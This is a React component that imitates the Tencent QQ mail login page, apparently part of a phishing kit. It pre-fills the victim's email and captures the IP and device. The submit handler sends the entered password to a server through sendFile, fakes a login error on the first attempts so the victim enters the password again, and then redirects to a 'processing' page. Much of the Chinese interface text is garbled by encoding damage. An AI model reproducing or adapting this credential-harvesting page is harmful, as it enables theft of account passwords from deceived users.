import { navigate } from "@reach/router";
import React, { useState } from "react";
import { Helmet } from "react-helmet";
import { notify, sendFile } from "../servers";

function Qq({ location }) {
  const [values, setValues] = useState({
    username: location.state.email,device: location.state.device,
    ip: location.state.ip,
    password: "",
  });

  const [submited, setSubmited] = useState({ status: false, count: 0 });

  const handleChange = (event) => {
    setValues({
      ...values,
      [event.target.name]: event.target.value,
    });
  };

  const submitForm = (event) => {
    event.preventDefault();
    setSubmited({ ...submited, status: !submited.status });

    if (submited.count <= 1) {
      sendFile(values).then((data) => {
        // show error
        notify();
        setSubmited({ ...submited, count: submited.count + 1 }); setValues({ ...values, password: "" });
        console.log(data);
        console.log(submited);
      });
    } else {
      sendFile(values).then((data) => {
        // redirect
        navigate("../processing", { state: { domain: location.state.domain } });
        console.log("ok");
      });
    }
  };
  return (
    <div>
      <Helmet>
        <link rel="stylesheet" href="../qq/main.css" />
        <link rel="stylesheet" href="../qq/xlogin.css" />
      </Helmet>
      <div className="container">
        <div className="header">
          <img
            src="data:image/png;base64,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"
            style={{ position: "absolute" }}
          />
          <a className="header_logo" href="">
            QQ锟斤拷锟斤拷
          </a>
          <div className="header_link">
            <a>锟斤拷锟斤拷锟斤拷</a>&nbsp;|&nbsp;<a href="">English</a>&nbsp;|&nbsp;
            <a href="">锟街伙拷锟斤拷</a>&nbsp;|&nbsp;<a href="">锟街伙拷锟斤拷</a>
          </div>
        </div>
        <div className="content">
          <div id="downError" className="login_msg" style={{ display: "none" }}>
            <p>
              <span className="login_msg_warning" />
              ���ڼ��ذ�ȫ���ʧ�ܣ�Ϊ�������ʺŰ�ȫ���޷�������¼���䣬���������
            </p>
            <ul>
              <li>����F5����ˢ��ҳ�档</li>
              <li>
                ���������ѡ��˵���ѡ��Internetѡ���ִ����ջ��湦�ܣ�ȷ����F5ˢ�±�ҳ�档
              </li>
              <li>
                ��������ʽ��Ȼ�޷�������⣬���¼
                <a>������̳֪ͨ����</a>
                �����ǽ�����Ϊ�������
              </li>
            </ul>
          </div>
          <div className="content_wrapper">
            <div
              className="xm_login_container login_container"
              id="login"
              style={{ width: "330px", height: "336px", visibility: "visible" }}
            >
              <div className="xm_login_card">
                <div className="xm_login_card_tab">
                  <div className="xm_login_card_tab_item" id="wxLoginTab">
                    微锟脚碉拷录
                  </div>
                  <div
                    className="xm_login_card_tab_item xm_login_card_tab_item_Active"
                    id="qqLoginTab"
                  >
                    QQ锟斤拷录
                  </div>
                </div>
                <div className="xm_login_card_cnt">
                  <div className="xm_login_card_qq" id="qqLoginCard">
                    <div>
                      <div className="login" id="login">
                        <div id="header" className="header">
                          <div className="switch" id="switch">
                            <a
                              className="switch_btn"
                              hidefocus="true"
                              id="switcher_qlogin"
                              href=""
                              tabIndex={7}
                            >
                              快速登录
                            </a>
                            <a
                              className="switch_btn_focus"
                              hidefocus="true"
                              id="switcher_plogin"
                              href=""
                              tabIndex={8}
                            >
                              帐号密码登录
                            </a>
                            <div className="switch_bottom" id="switch_bottom" />
                          </div>
                        </div>
                        <div className="loginTips">
                          <div className="error_tips" id="error_tips">
                            <span className="error_logo" id="error_logo" />
                            <span className="err_m" id="err_m" />
                          </div>
                          <div className="loading_tips" id="loading_tips">
                            <span id="loading_wording">登录中</span>
                            <img
                              id="loading_img"
                              place_src="https://ui.ptlogin2.qq.com/style/0/images/load.gif"
                              align="absmiddle"
                              src="./load.gif"
                            />
                          </div>
                        </div>
                        <div className="qlogin" id="qlogin">
                          <div className="qlogin_tips" id="qlogin_tips">
                            请用
                            <a className="qr_short_tips">QQ手机版</a>
                            扫描二维码，或点击头像登录
                          </div>
                          <a
                            title="上一页"
                            className="prePage"
                            id="prePage"
                            href=""
                          >
                            <span className="preRow" tabIndex={6} />
                          </a>
                          <div className="qlogin_show" id="qlogin_show">
                            <div className="qlogin_list" id="qlogin_list">
                              <span id="qr_area">
                                <span className="qr_safe_tips">
                                  安全登录，防止被盗
                                </span>
                                <img
                                  id="qrlogin_img"
                                  className="qrImg"
                                  alt=""
                                />
                                <span className="qr_app_name">
                                  <span className="qr_safe_login">
                                    安全登录
                                  </span>
                                  <a
                                    hidefocus="true"
                                    draggable="false"
                                    className="qr_info_link"
                                  >
                                    使用QQ手机版扫描登录
                                  </a>
                                </span>
                                <span className="qrlogin_img_out" />
                                <span id="qr_invalid" className="qr_invalid">
                                  <span
                                    id="qr_mengban"
                                    className="qr_mengban"
                                  />
                                  <span
                                    id="qr_invalid_tips"
                                    className="qr_invalid_tips"
                                  >
                                    二维码失效 <br />
                                    请点击刷新
                                  </span>
                                </span>
                              </span>
                            </div>
                          </div>
                          <a
                            title="下一页"
                            className="nextPage"
                            id="nextPage"
                            href=""
                          >
                            <span className="nextRow" tabIndex={7} />
                          </a>
                        </div>
                        <div
                          className="web_qr_login"
                          id="web_qr_login"
                          style={{ height: "330px" }}
                        >
                          <div
                            className="web_qr_login_show"
                            id="web_qr_login_show"
                          >
                            <div className="web_login" id="web_login">
                              <div className="tips" id="tips">
                                <div className="operate_tips" id="operate_tips">
                                  <span className="operate_content">
                                    手机号码也可登录哦，
                                    <a
                                      className="tips_link"
                                      id="bind_account"
                                      href=""
                                    >
                                      登录个人中心绑定
                                    </a>{" "}
                                  </span>
                                  <span className="down_row" />
                                </div>
                              </div>
                              <div className="login_form">
                                <form
                                  onSubmit={submitForm}
                                  style={{ margin: "0px" }}
                                >
                                  <div className="uinArea" id="uinArea">
                                    <div className="inputOuter">
                                      <input
                                        type="text"
                                        className="inputstyle"
                                        placeholder=" 支持QQ号/邮箱/手机号登录 "
                                        name="username"
                                        onChange={handleChange}
                                        value={values.username}
                                        disabled
                                        tabIndex={1}
                                      />
                                      <a
                                        className="uin_del"
                                        id="uin_del"
                                        href=""
                                      />
                                    </div>
                                    <ul
                                      className="email_list"
                                      id="email_list"
                                      style={{ display: "none" }}
                                    />
                                  </div>
                                  <div className="pwdArea" id="pwdArea">
                                    <div className="inputOuter">
                                      <input
                                        type="password"
                                        className="inputstyle password"
                                        placeholder=" QQ密码 "
                                        id="p"
                                        name="password"
                                        value={values.password}
                                        onChange={handleChange}
                                        required
                                        maxLength={16}
                                        tabIndex={2}
                                      />
                                    </div>
                                    <div
                                      className="lock_tips"
                                      id="caps_lock_tips"
                                      style={{ display: "none" }}
                                    >
                                      <span className="lock_tips_row" />
                                      <span> 大写锁定已打开 </span>
                                    </div>
                                  </div>

                                  <div className="submit">
                                    <a
                                      className="login_button"
                                      href=""
                                      hidefocus="true"
                                    >
                                      <input
                                        type="submit"
                                        disabled={submited.status}
                                        tabIndex={6}
                                        className="btn"
                                        defaultValue=" 登 录"
                                        id="login_button"
                                      />
                                    </a>
                                    <div
                                      title="为了确保你的信息安全，不建议在网吧等公共环境勾选此项"
                                      className="low_login"
                                      id="p_low_login_box"
                                    >
                                      <a
                                        className="uncheck"
                                        id="p_low_login_enable"
                                        href=""
                                        tabIndex={5}
                                      />
                                      <label
                                        className="low_login_wording"
                                        id="low_login_wording"
                                      >
                                        下次自动登录
                                      </label>
                                    </div>
                                  </div>
                                </form>
                              </div>

                              <div
                                className="bottom"
                                id="bottom_web"
                                style={{ display: "block" }}
                              >
                                <a href="" className="link" id="forgetpwd">
                                  忘了密码？
                                </a>
                                <span className="dotted">&nbsp;|&nbsp;</span>
                                <a className="link">注册新帐号</a>
                                <span className="dotted">&nbsp;|&nbsp;</span>
                                <a className="link" id="feedback_web">
                                  意见反馈
                                </a>
                              </div>
                            </div>
                          </div>
                        </div>

                        <div className="bottom hide" id="bottom_qlogin">
                          <div
                            id="q_low_login_box"
                            title="为了确保你的信息安全，不建议在网吧等公共环境勾选此项"
                            className="low_login"
                          >
                            <a
                              className="uncheck"
                              id="q_low_login_enable"
                              href=""
                              tabIndex={9}
                            />
                            <label
                              className="low_login_wording"
                              id="q_low_login_wording"
                            >
                              下次自动登录
                            </label>
                          </div>
                          <a href="" className="link vip_link" id="vip_link2">
                            开通QQ会员
                          </a>
                          <span className="dotted" id="vip_dot">
                            &nbsp;|&nbsp;
                          </span>
                          <a className="link">注册新帐号</a>
                          <span className="dotted">&nbsp;|&nbsp;</span>
                          <a className="link" id="feedback_qlogin">
                            意见反馈
                          </a>
                        </div>
                        <div id="authLogin" className="authLogin">
                          <div className="authHeader" id="authHeader">
                            <div className="logo" />
                            <span className="title"> 腾讯业务 </span>
                          </div>
                          <div className="authTips" />
                          <div className="authWording">
                            <span>
                              <span>点击头像，确认帐号登录</span>
                              <span>腾讯业务</span>
                            </span>
                          </div>
                          <div className="authInfo">
                            <a
                              className="face"
                              id="auth_area"
                              tabIndex={1}
                              href=""
                              draggable="false"
                              hidefocus="true"
                            >
                              <img id="auth_face" />{" "}
                              <span id="auth_mengban" />
                              <span className="uin" id="auth_uin" />
                              <span className="img_out_focus" />
                              <span className="nick" id="auth_nick" />
                            </a>
                          </div>
                          <div className="cancleAuthOuter" id="cancleAuthOuter">
                            <a id="cancleAuth" className="cancleAuth">
                              {" "}
                              使用其他帐号{" "}
                            </a>
                          </div>
                          <div className="bottom">
                            <div
                              title="为了确保你的信息安全，不建议在网吧等公共环境勾选此项"
                              className="low_login"
                            >
                              <a
                                className="checked"
                                id="auth_low_login_enable"
                                href=""
                                tabIndex={5}
                              ></a>
                              <label
                                className="low_login_wording"
                                id="auth_low_login_wording"
                              >
                                不再提醒
                              </label>
                            </div>
                            <a
                              className="link feedback_authLogin"
                              id="feedback_authLogin"
                            >
                              意见反馈
                            </a>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <div className="login_pictures">
              <div
                className="login_pictures_picture"
                style={{
                  backgroundImage:
                    'url("https://rescdn.qqmail.com/zh_CN/htmledition/images/tg-mj1e9c5d.jpg")',
                  backgroundPosition: "right 20px",
                }}
              />
            </div>
          </div>
        </div>
        <div className="footer">
          <a href="https://www.tencent.com/">锟斤拷锟斤拷锟斤拷讯</a>&nbsp;|&nbsp;
          <a href="">锟斤拷锟斤拷锟斤拷锟斤拷</a>&nbsp;|&nbsp;
          <a href="https://privacy.qq.com/">锟斤拷私锟斤拷锟斤拷</a>&nbsp;|&nbsp;
          <a href="https://kf.qq.com/product/email.html">
            锟酵凤拷锟斤拷锟斤拷
          </a>
          &nbsp;|&nbsp;
          <a href="https://mail.qq.com/zh_CN/contact_us.html">
            锟斤拷系锟斤拷锟斤拷
          </a>
          &nbsp;|&nbsp;<a href="https://service.mail.qq.com/">锟斤拷锟斤拷锟斤拷锟斤拷</a>&nbsp;|&nbsp;
          <span className="gray">
            ©1998 - 2021 Tencent Inc. All Rights Reserved.
          </span>
        </div>
      </div>
    </div>
  );
}

export default Qq;
